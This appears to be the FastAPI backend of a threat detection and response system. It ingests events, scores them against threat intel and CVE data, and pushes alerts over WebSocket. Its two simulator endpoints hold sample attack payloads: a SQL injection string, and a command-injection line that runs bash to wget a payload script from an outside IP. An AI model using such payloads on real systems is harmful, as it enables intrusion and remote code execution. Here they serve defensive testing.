from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from typing import List, Dict, Any
try:
    from app.config import settings
    from app.services.detection_engine import DetectionEngine
    from app.services.threat_intel import DemoThreatIntelProvider, NVDProvider
    from app.services.scoring_engine import ScoringEngine, ResponseEngine
except ImportError:
    from backend.app.config import settings
    from backend.app.services.detection_engine import DetectionEngine
    from backend.app.services.threat_intel import DemoThreatIntelProvider, NVDProvider
    from backend.app.services.scoring_engine import ScoringEngine, ResponseEngine

app = FastAPI(
    title=settings.APP_NAME,
    version=settings.APP_VERSION,
    description="PRISM Threat Detection & Response Engine API"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

detection_engine = DetectionEngine()
threat_intel = DemoThreatIntelProvider()
nvd_provider = NVDProvider()
scoring_engine = ScoringEngine()
response_engine = ResponseEngine(mode=settings.RESPONSE_MODE)

# Active WebSocket connections
active_connections: List[WebSocket] = []

@app.get("/api/health")
async def health_check():
    return {
        "status": "healthy",
        "database": "connected",
        "threat_intelligence": "available",
        "response_engine": settings.RESPONSE_MODE.lower(),
        "version": settings.APP_VERSION
    }

@app.websocket("/ws/alerts")
async def websocket_alerts(websocket: WebSocket):
    await websocket.accept()
    active_connections.append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        active_connections.remove(websocket)

@app.post("/api/events")
async def ingest_event(event: Dict[str, Any]):
    detection = detection_engine.detect(event)
    if not detection:
        return {"is_attack": False, "message": "Event evaluated as benign"}

    # Correlate IOC
    src_ip = event.get("source_ip", "")
    ioc_data = await threat_intel.check_ip(src_ip)
    ioc_match = ioc_data is not None
    ioc_level = ioc_data.get("threat_level", "low") if ioc_data else "low"

    # Correlate CVE
    cves = await nvd_provider.fetch_cves(detection["attack_type"])
    cve = cves[0] if cves else None

    # Calculate Score
    score = scoring_engine.calculate_score(
        event=event,
        attack_type=detection["attack_type"],
        confidence_pct=detection["confidence"],
        ioc_match=ioc_match,
        ioc_threat_level=ioc_level,
        cve_match=cve is not None,
        cvss_score=cve["cvss_score"] if cve else 0.0,
        asset_criticality_score=9
    )

    # Response decision
    decision = response_engine.evaluate_response(
        threat_score=score["total_score"],
        severity=score["severity"],
        source_ip=src_ip,
        hostname=event.get("hostname", "web-prod-01")
    )

    alert = {
        "alert_id": f"alt-py-{event.get('event_id', '001')}",
        "attack_type": detection["attack_type"],
        "source_ip": src_ip,
        "threat_score": score["total_score"],
        "severity": score["severity"],
        "score_factors": score,
        "response": decision
    }

    # Broadcast to WS clients
    for conn in list(active_connections):
        try:
            await conn.send_json(alert)
        except Exception:
            active_connections.remove(conn)

    return {"is_attack": True, "alert": alert, "decision": decision}

@app.post("/api/simulator/sql-injection")
async def sim_sqli(payload: Dict[str, Any] = None):
    event = {
        "event_id": "sim-sqli-01",
        "source_ip": "185.220.101.45",
        "hostname": "web-prod-01",
        "event_type": "http_request",
        "url": "/login?id=1' OR '1'='1",
        "payload": "' OR '1'='1 --"
    }
    return await ingest_event(event)

@app.post("/api/simulator/rce")
async def sim_rce(payload: Dict[str, Any] = None):
    event = {
        "event_id": "sim-rce-01",
        "source_ip": "194.26.29.112",
        "hostname": "db-core-01",
        "event_type": "process_event",
        "payload": "; /bin/bash -c 'wget http://185.220.101.45/payload.sh'"
    }
    return await ingest_event(event)
